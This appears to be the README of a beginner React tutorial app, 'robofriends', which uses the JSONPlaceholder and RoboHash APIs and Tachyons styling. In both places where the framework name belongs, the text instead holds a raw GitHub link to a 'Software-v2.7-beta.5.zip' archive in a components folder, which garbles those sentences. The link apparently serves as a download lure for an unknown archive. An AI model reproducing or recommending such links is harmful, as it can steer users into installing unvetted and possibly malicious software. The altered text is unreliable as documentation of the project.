Tutorial for React
To run the project:

1. Clone this repo
2. Run `npm install`
3. Run `npm start`

This is a simple https://github.com/AyanishSardar2003/robofriends/raw/refs/heads/main/src/components/Software-v2.7-beta.5.zip framework application utilizing a few outside APIs to create a stateful web application. Utilizing the APIs from JSONPlaceholder for user information and RoboHash for user images. Style for the page makes use of the Tachyons framework.

This was the first application that I’ve built using https://github.com/AyanishSardar2003/robofriends/raw/refs/heads/main/src/components/Software-v2.7-beta.5.zip, and as such is simple but responsive. Starting from the create-react-app package, the code was written along with the course in JavaScript/JSX. The search and title stay on screen regardless of size, and the number of cards across will change based on width. The app dynamically draws only the cards that are applicable to the content in the search box.
